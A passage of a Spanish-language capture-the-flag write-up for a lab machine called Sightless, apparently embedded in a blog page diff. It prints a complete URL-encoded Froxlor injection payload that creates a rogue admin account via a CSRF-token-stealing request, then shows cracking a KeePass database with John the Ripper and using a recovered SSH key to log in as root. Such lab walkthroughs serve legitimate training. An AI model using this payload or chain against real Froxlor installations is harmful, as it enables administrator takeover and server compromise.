+<p>Una vez interceptado, el parámetro <code class="language-plaintext highlighter-rouge">loginname</code> lo cambiamos por esto:</p>
+
+<blockquote>
+  <p>[!Note]
+admin{{$emit.constructor<code class="language-plaintext highlighter-rouge">function+b(){var+metaTag%3ddocument.querySelector('meta[name%3d"csrf-token"]')%3bvar+csrfToken%3dmetaTag.getAttribute('content')%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d"http%3a//admin.sightless.htb:8080/admin_admins.php"%3bvar+params%3d"new_loginname%3dabcd%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d"%2bcsrfToken%2b"%26page%3dadmins%26action%3dadd%26send%3dsend"%3bxhr.open("POST",url,true)%3bxhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")%3balert("Your+Froxlor+Application+has+been+completely+Hacked")%3bxhr.send(params)}%3ba%3db()</code>()}}</p>
+</blockquote>
+
+<p>el cuál es el payload que vimos en el github, lo único que modificamos fué la url de https://demo.froxlor.org a http://admin.sightless.htb:8080/admin_admins.php y una vez enviado el paquete, nos logeamos con las credenciales abcd:Abcd@@1234 y entramos como admins a froxlor.</p>
+
+<p>Enumerando, vemos que existe el user web1 en el apartado de tráfico, y que el mismo solo ha tenido tráfico vía FTP.</p>
+
+<p><img src="/assets/images/writeups/Pasted image 20260211202348.png" alt="" /></p>
+
+<p>Indagando en la página, nos permite logearnos como el user web1 simplemente dandole click al nombre, y si entramos a FTP y cuentas, nos permite cambiar la contraseña del user <code class="language-plaintext highlighter-rouge">web1</code></p>
+
+<p><img src="/assets/images/writeups/Pasted image 20260211203503.png" alt="" /></p>
+
+<p>Como ya cambiamos la contraseña y sabemos que el user <code class="language-plaintext highlighter-rouge">web1</code> está utilizando FTP, intentamos logearnos mediante ftp, específicamente mediante FileZilla, con las credenciales ya puestas <code class="language-plaintext highlighter-rouge">web1:Abcd@@1234</code></p>
+
+<p>y encontramos en la carpeta backup, un archivo que es de keepass, <code class="language-plaintext highlighter-rouge">Database.kdb</code></p>
+
+<p><img src="/assets/images/writeups/Pasted image 20260211205055.png" alt="" /></p>
+
+<p>Lo descargamos y lo obtenemos en nuestra máquina host; con la herramienta <code class="language-plaintext highlighter-rouge">keepass2john</code> podemos convertirla a hash y luego proceder a crackearla con john the ripper</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">╭─</span> <span class="n">root</span><span class="vi">@exegol</span> <span class="err"></span> <span class="err"></span>  <span class="o">~</span>                                                                                                                                                                                         <span class="err"></span>  <span class="mi">08</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">52</span> <span class="no">PM</span>
+<span class="err">╰─❯</span> <span class="n">keepass2john</span> <span class="no">Database</span><span class="p">.</span><span class="nf">kdb</span> <span class="o">&gt;</span> <span class="no">Database</span><span class="p">.</span><span class="nf">kdb</span><span class="p">.</span><span class="nf">hash</span>
+
+<span class="err">╭─</span> <span class="n">root</span><span class="vi">@exegol</span> <span class="err"></span> <span class="err"></span>  <span class="o">~</span>                                                                                                                                                                                         <span class="err">✘</span> <span class="mi">255</span> <span class="err"></span>  <span class="mi">08</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">45</span> <span class="no">PM</span>
+<span class="err">╰─❯</span> <span class="n">john</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=</span><span class="sb">`fzf-wordlists`</span> <span class="no">Database</span><span class="p">.</span><span class="nf">kdb</span><span class="p">.</span><span class="nf">hash</span> <span class="o">--</span><span class="nb">format</span><span class="o">=</span><span class="no">KeePass</span>
+<span class="no">Using</span> <span class="n">default</span> <span class="n">input</span> <span class="ss">encoding: </span><span class="no">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="no">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="no">KeePass</span> <span class="p">[</span><span class="no">AES</span><span class="o">/</span><span class="no">Argon2</span> <span class="mi">128</span><span class="o">/</span><span class="mi">128</span> <span class="no">SSE2</span><span class="p">])</span>
+<span class="no">Cost</span> <span class="mi">1</span> <span class="p">(</span><span class="n">t</span> <span class="p">(</span><span class="n">rounds</span><span class="p">))</span> <span class="n">is</span> <span class="mi">600000</span> <span class="k">for</span> <span class="n">all</span> <span class="n">loaded</span> <span class="n">hashes</span>
+<span class="no">Cost</span> <span class="mi">2</span> <span class="p">(</span><span class="n">m</span><span class="p">)</span> <span class="n">is</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">all</span> <span class="n">loaded</span> <span class="n">hashes</span>
+<span class="no">Cost</span> <span class="mi">3</span> <span class="p">(</span><span class="nb">p</span><span class="p">)</span> <span class="n">is</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">all</span> <span class="n">loaded</span> <span class="n">hashes</span>
+<span class="no">Cost</span> <span class="mi">4</span> <span class="p">(</span><span class="no">KDF</span> <span class="p">[</span><span class="mi">0</span><span class="o">=</span><span class="no">Argon2d</span> <span class="mi">2</span><span class="o">=</span><span class="no">Argon2id</span> <span class="mi">3</span><span class="o">=</span><span class="no">AES</span><span class="p">])</span> <span class="n">is</span> <span class="mi">3</span> <span class="k">for</span> <span class="n">all</span> <span class="n">loaded</span> <span class="n">hashes</span>
+<span class="no">Will</span> <span class="n">run</span> <span class="mi">12</span> <span class="no">OpenMP</span> <span class="n">threads</span>
+<span class="no">Note</span><span class="p">:</span> <span class="no">Passwords</span> <span class="n">longer</span> <span class="n">than</span> <span class="mi">41</span> <span class="p">[</span><span class="n">worst</span> <span class="k">case</span> <span class="no">UTF</span><span class="o">-</span><span class="mi">8</span><span class="p">]</span> <span class="n">to</span> <span class="mi">124</span> <span class="p">[</span><span class="no">ASCII</span><span class="p">]</span> <span class="n">rejected</span>
+<span class="no">Press</span> <span class="s1">'q'</span> <span class="ow">or</span> <span class="no">Ctrl</span><span class="o">-</span><span class="no">C</span> <span class="n">to</span> <span class="nb">abort</span><span class="p">,</span> <span class="s1">'h'</span> <span class="k">for</span> <span class="n">help</span><span class="p">,</span> <span class="n">almost</span> <span class="n">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>
+<span class="no">Failed</span> <span class="n">to</span> <span class="n">use</span> <span class="n">huge</span> <span class="n">pages</span> <span class="p">(</span><span class="ow">not</span> <span class="n">pre</span><span class="o">-</span><span class="n">allocated</span> <span class="n">via</span> <span class="n">sysctl?</span> <span class="n">that</span><span class="err">'</span><span class="n">s</span> <span class="n">fine</span><span class="p">)</span>
+<span class="n">bulldogs</span>         <span class="p">(</span><span class="no">Database</span><span class="p">.</span><span class="nf">kdb</span><span class="p">)</span>
+<span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">02</span> <span class="no">DONE</span> <span class="p">(</span><span class="mi">2026</span><span class="o">-</span><span class="mo">02</span><span class="o">-</span><span class="mi">11</span> <span class="mi">20</span><span class="p">:</span><span class="mi">57</span><span class="p">)</span> <span class="mf">0.4444</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mf">458.7</span><span class="nb">p</span><span class="o">/</span><span class="n">s</span> <span class="mf">458.7</span><span class="n">c</span><span class="o">/</span><span class="n">s</span> <span class="mf">458.7</span><span class="no">C</span><span class="o">/</span><span class="n">s</span> <span class="n">simpleplan</span><span class="o">..</span><span class="n">harold</span>
+<span class="no">Use</span> <span class="n">the</span> <span class="s2">"--show"</span> <span class="n">option</span> <span class="n">to</span> <span class="nb">display</span> <span class="n">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
+<span class="no">Session</span> <span class="n">completed</span><span class="o">.</span>
+
+</code></pre></div></div>
+
+<p>Como se observa en john, la contraseña es <code class="language-plaintext highlighter-rouge">bulldogs</code>, procedemos a entrar a la base de datos; Se procede a instalar <code class="language-plaintext highlighter-rouge">kpcli</code> con <code class="language-plaintext highlighter-rouge">sudo apt install kpcli</code></p>
+
+<p>![](/assets/images/writeups/Pasted image 20260211210140.png]]</p>
+
+<p>Enumerando la base de datos, una contraseña y un id_rsa, obtenemos el id_rsa con keepass y el comando  <code class="language-plaintext highlighter-rouge">attach ssh</code></p>
+
+<p><img src="/assets/images/writeups/Pasted image 20260211210434.png" alt="" /></p>
+
+<p>Al obtener la clave ssh, si intentamos logearnos como root, mediante ssh, nos daba el error <code class="language-plaintext highlighter-rouge">Load key "id_key": error in libcrypto</code>, simplemente pasándole el comando <code class="language-plaintext highlighter-rouge">dosunix id_key</code> resolvimos el problema. Nos logeamos como root y ya obtuvimos la flag del root.txt:</p>
+
+<p><img src="/assets/images/writeups/Pasted image 20260211211550.png" alt="" /></p>
+
+<p>Y eso ha sido todo por esta máquina, he durado bastantes horas haciéndola porque mientras la hacía redactaba el writeup :) Espero les haya gustado mi writeup, aunque no es el mejor de todos es el tercero que hago.</p>
+
+  </div>
+
+</article>
+
+
+    </div>
+
+  </main>
+
+  <script src="/assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  // Busca todos los blockquotes
+  const blockquotes = document.querySelectorAll('blockquote');
+
+  blockquotes.forEach(bq => {
+    // Busca si el primer párrafo empieza con [!
+    const firstP = bq.querySelector('p');
+    if (!firstP) return;
+
+    const content = firstP.textContent;
+    const match = content.match(/^\[!(\w+)\]/);
+
+    if (match) {
+      // Es un callout de Obsidian!
+      const type = match[1].toLowerCase();
+      
+      // Crear el contenedor nuevo
+      const wrapper = document.createElement('div');
+      wrapper.className = 'callout';
+      wrapper.setAttribute('data-type', type);
+
+      // Crear el título
+      const title = document.createElement('div');
+      title.className = 'callout-title';
+      // Capitalizar primera letra
+      title.innerText = type.charAt(0).toUpperCase() + type.slice(1);
+      
+      // Limpiar el texto original "[!note]" del primer párrafo
+      firstP.innerHTML = firstP.innerHTML.replace(/^\[!(\w+)\]\s*/, '');
+
+      // Armar la nueva estructura
+      wrapper.appendChild(title);
+      
+      // Mover todo el contenido del blockquote al nuevo div
+      while (bq.firstChild) {
+        wrapper.appendChild(bq.firstChild);
+      }
+
+      // Reemplazar el blockquote original por nuestro div chulo
+      bq.parentNode.replaceChild(wrapper, bq);
+    }
+  });
+});
+</script>
+
+</body>
+</html>
